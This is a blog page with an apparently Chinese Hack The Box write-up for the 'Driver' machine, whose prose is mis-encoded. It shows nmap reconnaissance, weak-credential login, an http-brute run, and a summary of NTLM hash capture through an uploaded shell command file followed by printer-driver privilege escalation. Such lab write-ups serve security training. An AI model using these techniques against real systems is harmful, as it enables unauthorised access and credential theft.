<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB-Driver | icon'Blog</title><meta name="author" content="icon"><meta name="copyright" content="icon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTB-Driver:æœºå™¨ç®€ä»‹ï¼šDriver æ˜¯ä¸€å°ç®€å•çš„ Windows æœºå™¨ï¼Œä¸“æ³¨äºæ‰“å°æœºå¼€å‘ã€‚å¯¹æœºå™¨çš„æšä¸¾æ˜¾ç¤ºï¼ŒWeb æœåŠ¡å™¨æ­£åœ¨ç›‘å¬ç«¯å£ 80ï¼ŒåŒæ—¶ SMB æ­£åœ¨ç›‘å¬ç«¯å£ 445ï¼ŒWinRM æ­£åœ¨ç›‘å¬ç«¯å£ 5985ã€‚å¯¼èˆªåˆ°è¯¥ç½‘ç«™æ˜¾ç¤ºï¼Œå®ƒä½¿ç”¨åŸºæœ¬ HTTP èº«ä»½éªŒè¯å—åˆ°ä¿æŠ¤ã€‚åœ¨å°è¯•å¸¸ç”¨å‡­æ®æ—¶ï¼Œadmin:admin å‡­æ®è¢«æ¥å—ï¼Œå› æ­¤æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®è¯¥ç½‘é¡µã€‚è¯¥ç½‘é¡µæä¾›äº†ä¸€é¡¹åŠŸèƒ½ï¼Œå¯ä»¥å°†æ‰“å°æœºå›ºä»¶ä¸Š">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB-Driver">
<meta property="og:url" content="https://iconabc.github.io/posts/23837ad8.html">
<meta property="og:site_name" content="icon&#39;Blog">
<meta property="og:description" content="HTB-Driver:æœºå™¨ç®€ä»‹ï¼šDriver æ˜¯ä¸€å°ç®€å•çš„ Windows æœºå™¨ï¼Œä¸“æ³¨äºæ‰“å°æœºå¼€å‘ã€‚å¯¹æœºå™¨çš„æšä¸¾æ˜¾ç¤ºï¼ŒWeb æœåŠ¡å™¨æ­£åœ¨ç›‘å¬ç«¯å£ 80ï¼ŒåŒæ—¶ SMB æ­£åœ¨ç›‘å¬ç«¯å£ 445ï¼ŒWinRM æ­£åœ¨ç›‘å¬ç«¯å£ 5985ã€‚å¯¼èˆªåˆ°è¯¥ç½‘ç«™æ˜¾ç¤ºï¼Œå®ƒä½¿ç”¨åŸºæœ¬ HTTP èº«ä»½éªŒè¯å—åˆ°ä¿æŠ¤ã€‚åœ¨å°è¯•å¸¸ç”¨å‡­æ®æ—¶ï¼Œadmin:admin å‡­æ®è¢«æ¥å—ï¼Œå› æ­¤æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®è¯¥ç½‘é¡µã€‚è¯¥ç½‘é¡µæä¾›äº†ä¸€é¡¹åŠŸèƒ½ï¼Œå¯ä»¥å°†æ‰“å°æœºå›ºä»¶ä¸Š">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://iconabc.github.io/img/mbc.jpg">
<meta property="article:published_time" content="2024-11-22T15:52:37.000Z">
<meta property="article:modified_time" content="2024-12-02T10:45:01.682Z">
<meta property="article:author" content="icon">
<meta property="article:tag" content="å†…ç½‘">
<meta property="article:tag" content="é¶åœº">
<meta property="article:tag" content="HTB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://iconabc.github.io/img/mbc.jpg"><link rel="shortcut icon" href="/img/shasha.png"><link rel="canonical" href="https://iconabc.github.io/posts/23837ad8.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: {"limitCount":150,"languages":{"author":"ä½œè€…: icon","link":"é“¾æ¥: ","source":"æ¥æº: icon'Blog","info":"è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚"}},
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HTB-Driver',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/mbc.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">21</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/shuai.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">icon'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB-Driver</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTB-Driver</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2024-11-22T15:52:37.000Z" title="å‘è¡¨äº 2024-11-22 23:52:37">2024-11-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2024-12-02T10:45:01.682Z" title="æ›´æ–°äº 2024-12-02 18:45:01">2024-12-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB-Driver/">HTB-Driver</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">æ€»å­—æ•°:</span><span class="word-count">8.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>39åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="HTB-Driver"><a href="#HTB-Driver" class="headerlink" title="HTB-Driver:"></a>HTB-Driver:</h1><h2 id="æœºå™¨ç®€ä»‹ï¼š"><a href="#æœºå™¨ç®€ä»‹ï¼š" class="headerlink" title="æœºå™¨ç®€ä»‹ï¼š"></a>æœºå™¨ç®€ä»‹ï¼š</h2><p>Driver æ˜¯ä¸€å°ç®€å•çš„ Windows æœºå™¨ï¼Œä¸“æ³¨äºæ‰“å°æœºå¼€å‘ã€‚å¯¹æœºå™¨çš„æšä¸¾æ˜¾ç¤ºï¼ŒWeb æœåŠ¡å™¨æ­£åœ¨ç›‘å¬ç«¯å£ 80ï¼ŒåŒæ—¶ SMB æ­£åœ¨ç›‘å¬ç«¯å£ 445ï¼ŒWinRM æ­£åœ¨ç›‘å¬ç«¯å£ 5985ã€‚å¯¼èˆªåˆ°è¯¥ç½‘ç«™æ˜¾ç¤ºï¼Œå®ƒä½¿ç”¨åŸºæœ¬ HTTP èº«ä»½éªŒè¯å—åˆ°ä¿æŠ¤ã€‚åœ¨å°è¯•å¸¸ç”¨å‡­æ®æ—¶ï¼Œ<code>admin:admin</code> å‡­æ®è¢«æ¥å—ï¼Œå› æ­¤æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®è¯¥ç½‘é¡µã€‚è¯¥ç½‘é¡µæä¾›äº†ä¸€é¡¹åŠŸèƒ½ï¼Œå¯ä»¥å°†æ‰“å°æœºå›ºä»¶ä¸Šä¼ åˆ° SMB å…±äº«ä¸Šï¼Œä»¥ä¾›è¿œç¨‹å›¢é˜Ÿè¿›è¡Œæµ‹è¯•å’ŒéªŒè¯ã€‚ä¸Šä¼ åŒ…å«ä»æœ¬åœ°æœºå™¨è·å–è¿œç¨‹æ–‡ä»¶çš„å‘½ä»¤çš„ Shell å‘½ä»¤æ–‡ä»¶ä¼šå¯¼è‡´ç”¨æˆ· <code>tony</code> çš„ NTLM å“ˆå¸Œè¢«è½¬å‘å›ç»™æˆ‘ä»¬ã€‚ç ´è§£æ•è·çš„å“ˆå¸Œä»¥æ£€ç´¢çº¯æ–‡æœ¬å¯†ç ï¼Œæˆ‘ä»¬èƒ½å¤Ÿä½¿ç”¨ WinRM ä»¥ <code>tony</code> èº«ä»½ç™»å½•ã€‚ç„¶åï¼Œåˆ‡æ¢åˆ° meterpreter ä¼šè¯ï¼Œå‘ç°è¯¥æœºå™¨å®¹æ˜“å—åˆ°æœ¬åœ°ç‰¹æƒæ”»å‡»ï¼Œè¯¥æ”»å‡»ä¼šæ»¥ç”¨è¿œç¨‹æœºå™¨ä¸Šå­˜åœ¨çš„ç‰¹å®šæ‰“å°æœºé©±åŠ¨ç¨‹åºã€‚åˆ©ç”¨è¯¥æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—â€œNT AUTHORITY\SYSTEMâ€èº«ä»½çš„ä¼šè¯ã€‚</p>
<h2 id="æ¸—é€è¿‡ç¨‹ï¼š"><a href="#æ¸—é€è¿‡ç¨‹ï¼š" class="headerlink" title="æ¸—é€è¿‡ç¨‹ï¼š"></a>æ¸—é€è¿‡ç¨‹ï¼š</h2><h3 id="åˆå§‹ä¾¦å¯Ÿï¼š"><a href="#åˆå§‹ä¾¦å¯Ÿï¼š" class="headerlink" title="åˆå§‹ä¾¦å¯Ÿï¼š"></a>åˆå§‹ä¾¦å¯Ÿï¼š</h3><h4 id="nmapç«¯å£æ‰«æ"><a href="#nmapç«¯å£æ‰«æ" class="headerlink" title="nmapç«¯å£æ‰«æ"></a>nmapç«¯å£æ‰«æ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nmap -sT --min-rate 10000 -p- 10.129.40.36 -oA nmapscan/ports </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 07:49 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> loaclhost (10.129.40.36)</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 65531 filtered tcp ports (no-response)</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">80/tcp open http</span><br><span class="line">135/tcp open msrpc</span><br><span class="line">445/tcp open microsoft-ds</span><br><span class="line">5985/tcp open wsman</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 33.78 seconds</span><br></pre></td></tr></table></figure>

<h4 id="nmapè¯¦ç»†ä¿¡æ¯æ‰«æ"><a href="#nmapè¯¦ç»†ä¿¡æ¯æ‰«æ" class="headerlink" title="nmapè¯¦ç»†ä¿¡æ¯æ‰«æ"></a>nmapè¯¦ç»†ä¿¡æ¯æ‰«æ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nmap -sT -sV -sC -O -p80,135,445,5985 10.129.40.36 -oA</span><br><span class="line">nmapscan/detail</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 07:59 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> loaclhost (10.129.40.36)</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">80/tcp open http Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Site doesn\&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">| http-methods: </span><br><span class="line">|_ Potentially risky methods: TRACE</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_ Basic realm=MFP Firmware Update Center. Please enter password <span class="keyword">for</span> admin</span><br><span class="line">135/tcp open msrpc Microsoft Windows RPC</span><br><span class="line">445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup:</span><br><span class="line">WORKGROUP)</span><br><span class="line">5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1</span><br><span class="line">open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|phone</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|Phone (87%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8</span><br><span class="line">cpe:/o:microsoft:windows</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2008 R2 (87%), Microsoft</span><br><span class="line">Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">| account_used: guest</span><br><span class="line">| authentication_level: user</span><br><span class="line">| challenge_response: supported</span><br><span class="line">|_ message_signing: disabled (dangerous, but default)</span><br><span class="line">|_clock-skew: mean: 1h16m36s, deviation: 0s, median: 1h16m35s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">| 3:1:1: </span><br><span class="line">|_ Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">| <span class="built_in">date</span>: 2024-05-13T13:16:07</span><br><span class="line">|_ start_date: 2024-05-13T13:00:10</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at</span><br><span class="line">https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 54.97 seconds</span><br></pre></td></tr></table></figure>

<p>å¼€æ”¾äº†å››ä¸ªç«¯â¼ï¼Œæœ‰ä¿¡æ¯çš„è¯­å¥æ˜¯â€œ<strong>Basic realm&#x3D;MFP Firmware Update Center. Please enter password for admin</strong>â€ï¼Œå…¶ä¸­ä¹Ÿæåˆ°äº†â½¤æˆ·åadminã€‚</p>
<h4 id="nmap-udpæ‰«æ"><a href="#nmap-udpæ‰«æ" class="headerlink" title="nmap udpæ‰«æ"></a>nmap udpæ‰«æ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nmap -sU --top-ports 20 10.129.40.36 -oA nmapscan/udp </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 08:46 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> driver.htb (10.129.40.36)</span><br><span class="line">Host is up (0.091s latency).</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">53/udp open|filtered domain</span><br><span class="line">67/udp open|filtered dhcps</span><br><span class="line">68/udp open|filtered dhcpc</span><br><span class="line">69/udp open|filtered tftp</span><br><span class="line">123/udp open|filtered ntp</span><br><span class="line">135/udp open|filtered msrpc</span><br><span class="line">137/udp open|filtered netbios-ns</span><br><span class="line">138/udp open|filtered netbios-dgm</span><br><span class="line">139/udp open|filtered netbios-ssn</span><br><span class="line">161/udp open|filtered snmp</span><br><span class="line">162/udp open|filtered snmptrap</span><br><span class="line">445/udp open|filtered microsoft-ds</span><br><span class="line">500/udp open|filtered isakmp</span><br><span class="line">514/udp open|filtered syslog</span><br><span class="line">520/udp open|filtered route</span><br><span class="line">631/udp open|filtered ipp</span><br><span class="line">1434/udp open|filtered ms-sql-m</span><br><span class="line">1900/udp open|filtered upnp</span><br><span class="line">4500/udp open|filtered nat-t-ike</span><br><span class="line">49152/udp open|filtered unknown</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 3.13 seconds</span><br></pre></td></tr></table></figure>

<p>å¹¶æ²¡æœ‰æ˜ç¡®å¼€æ”¾çŠ¶æ€ï¼Œåç»­æŒ‰éœ€æ±‚è¿›è¡Œæ·±å…¥æ‰«æï¼Œå¯ä¸å…¶ä»–æ‰«æåŒæ­¥å¯åŠ¨ï¼ŒèŠ‚çº¦æ—¶é—´</p>
<h4 id="nmapæ¼æ´è„šæœ¬æ‰«æ"><a href="#nmapæ¼æ´è„šæœ¬æ‰«æ" class="headerlink" title="nmapæ¼æ´è„šæœ¬æ‰«æ"></a>nmapæ¼æ´è„šæœ¬æ‰«æ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nmap --script=vuln -p80,135,445,5985 10.129.40.36 -oA nmapscan/vuln</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 07:59 EDT</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">| Discovered hosts:</span><br><span class="line">| 224.0.0.251</span><br><span class="line">| After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_ Hosts are all up (not vulnerable).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> loaclhost (10.129.40.36)</span><br><span class="line">Host is up (0.081s latency).</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">80/tcp open http</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">135/tcp open msrpc</span></span><br><span class="line"><span class="string">445/tcp open microsoft-ds</span></span><br><span class="line"><span class="string">5985/tcp open wsman</span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_samba-vuln-cve-2012-1182: No accounts left to try</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-054: false</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 488.23 seconds</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ‰«æä¼šæœ‰ä¸€äº›æ…¢ï¼Œè€å¿ƒç­‰å¾…ï¼Œæ²¡æœ‰æ–°çš„æœ‰ä»·å€¼çš„ä¿¡æ¯</p>
<h4 id="web80ç«¯å£æ¸—é€"><a href="#web80ç«¯å£æ¸—é€" class="headerlink" title="web80ç«¯å£æ¸—é€"></a>web80ç«¯å£æ¸—é€</h4><p>æ‰“å¼€web 80ç«¯å£é¡µé¢ï¼Œæ˜¾ç¤ºç™»å½•è®¤è¯ï¼Œnmapæ‰«æç»“æœä¸­æç¤ºäº†ç”¨æˆ·åæ˜¯adminï¼Œè‡ªç„¶æƒ³åˆ°äº†å¼±å¯†ç adminï¼š</p>
<p>ä½¿ç”¨<code>admin:admin</code>æˆåŠŸç™»å½•</p>
<img src="/posts/23837ad8/1732291409911.png" class="" width="1732291409911">

<p>è¿™é‡Œä¹Ÿå¯ä»¥è‡ªå·±ä½¿ç”¨burpæŠ“åŒ…è¿›è¡Œçˆ†ç ´æ“ä½œã€‚</p>
<p>è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨nmapè‡ªå¸¦è„šæœ¬è¿›è¡Œçˆ†ç ´æ“ä½œï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nmap -p80 --script=http-brute driver.htb</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 12:43 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> driver.htb (10.129.40.36)</span><br><span class="line">Host is up (0.14s latency).</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">80/tcp open http</span><br><span class="line">| http-brute: </span><br><span class="line">| Accounts: </span><br><span class="line">| admin:admin - Valid credentials</span><br><span class="line">|_ Statistics: Performed 42132 guesses <span class="keyword">in</span> 600 seconds, average tps: 70.0</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 600.43 seconds</span><br></pre></td></tr></table></figure>

<p>ç™»å½•è¿›åå°åï¼Œé¡µé¢æ˜¾ç¤ºæ˜¯MFPå›ºä»¶æ›´æ–°ä¸­å¿ƒï¼Œæç¤ºâ€œæˆ‘ä»¬ä½œä¸ºå“è¶Šä¸­å¿ƒçš„ä¸€éƒ¨åˆ†ï¼Œå¯¹å¤šåŠŸèƒ½æ‰“å°æœºè¿›è¡Œå„ç§æµ‹è¯•ï¼ŒåŒ…æ‹¬å›ºä»¶æ›´æ–°ï¼Œé©±åŠ¨ç¨‹åºç­‰ã€‚â€æœ€ä¸‹æ–¹ä¿¡æ¯æ³„éœ²äº†ä¸€ä¸ªåŸŸåã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¿®æ”¹hostsæ–‡ä»¶ã€‚</p>
<img src="/posts/23837ad8/1732291681462.png" class="" width="1732291681462">

<p>æ‰§è¡Œå¦‚ä¸‹è¯­å¥ï¼Œæ·»åŠ hostsè®°å½•ï¼š</p>
